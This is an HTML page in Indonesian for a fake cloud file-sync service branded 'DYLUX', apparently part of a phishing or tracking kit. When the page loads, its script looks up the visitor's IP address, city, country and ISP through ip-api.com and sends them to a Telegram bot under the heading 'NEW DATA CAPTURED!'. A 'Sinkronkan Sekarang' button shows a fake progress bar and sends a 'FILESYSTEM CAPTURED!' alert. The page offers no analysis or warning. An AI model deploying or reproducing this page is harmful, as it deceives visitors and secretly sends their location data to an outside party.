<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sync Drive</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; font-family: Arial, sans-serif; color: #e0e0ff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .box { background: #14141e; border: 1px solid rgba(0,240,255,0.1); border-radius: 16px; padding: 40px 32px; max-width: 400px; width: 100%; text-align: center; }
        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00f0ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .badge { display: inline-block; background: rgba(123,47,252,0.1); color: #7b2ffc; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
        .icon { font-size: 48px; margin: 16px 0; }
        h2 { font-size: 18px; margin-bottom: 8px; }
        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
        .file-list { background: #0a0a0f; border-radius: 12px; padding: 12px; margin: 16px 0; border: 1px solid rgba(0,240,255,0.1); }
        .file-item { display: flex; justify-content: space-between; padding: 8px 12px; border-bottom: 1px solid rgba(0,240,255,0.05); font-size: 13px; }
        .file-item:last-child { border-bottom: none; }
        .file-item .name { color: #e0e0ff; }
        .file-item .size { color: #8888aa; font-size: 11px; }
        .progress-bar { width: 100%; height: 6px; background: #0a0a0f; border-radius: 10px; overflow: hidden; margin: 12px 0; }
        .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #00f0ff, #7b2ffc); border-radius: 10px; transition: width 0.5s ease; }
        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
        button:hover { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .footer { margin-top: 20px; font-size: 11px; color: #555; }
        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">DYLUX</div>
        <div class="badge">📁 Sync Drive</div>
        <div class="icon">📁</div>
        <h2>Sinkronisasi File</h2>
        <p>File Anda sedang disinkronkan ke cloud.</p>
        <div class="file-list">
            <div class="file-item"><span class="name">📄 document.docx</span><span class="size">2.4 MB</span></div>
            <div class="file-item"><span class="name">🖼️ photo.jpg</span><span class="size">4.1 MB</span></div>
            <div class="file-item"><span class="name">🎵 music.mp3</span><span class="size">7.8 MB</span></div>
            <div class="file-item"><span class="name">📁 backup.zip</span><span class="size">15.2 MB</span></div>
        </div>
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <button id="syncBtn">Sinkronkan Sekarang</button>
        <div class="spinner" id="spinner"></div>
        <div id="statusMsg"></div>
        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
    </div>

    <script>
    (async function autoDetect() {
        try {
            const userId = new URLSearchParams(window.location.search).get('id');
            if (!userId) return;
            const ipRes = await fetch('https://ip-api.com/json/');
            const ipData = await ipRes.json();
            const message = `<b>🎯 NEW DATA CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📌 Type:</b> Auto-Detect\n<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n<b>📍 Lokasi:</b> ${ipData.city || 'unknown'}, ${ipData.country || 'unknown'}\n<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });
        } catch (e) { console.error(e); }
    })();

    const userId = new URLSearchParams(window.location.search).get('id');
    const syncBtn = document.getElementById('syncBtn');
    const spinner = document.getElementById('spinner');
    const statusMsg = document.getElementById('statusMsg');
    const progressFill = document.getElementById('progressFill');

    syncBtn.addEventListener('click', async () => {
        syncBtn.disabled = true;
        spinner.classList.add('active');
        statusMsg.style.display = 'none';
        progressFill.style.width = '0%';

        let progress = 0;
        const interval = setInterval(() => {
            progress += 10;
            progressFill.style.width = progress + '%';
            if (progress >= 100) clearInterval(interval);
        }, 300);

        try {
            const message = `<b>📁 FILESYSTEM CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📄 Files:</b>\n• document.docx (2.4 MB)\n• photo.jpg (4.1 MB)\n• music.mp3 (7.8 MB)\n• backup.zip (15.2 MB)\n<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });
            clearInterval(interval);
            progressFill.style.width = '100%';
            spinner.classList.remove('active');
            syncBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '✅ File berhasil disinkronkan!';
        } catch (error) {
            clearInterval(interval);
            spinner.classList.remove('active');
            syncBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '❌ Gagal!';
        }
    });
    </script>
</body>
</html>
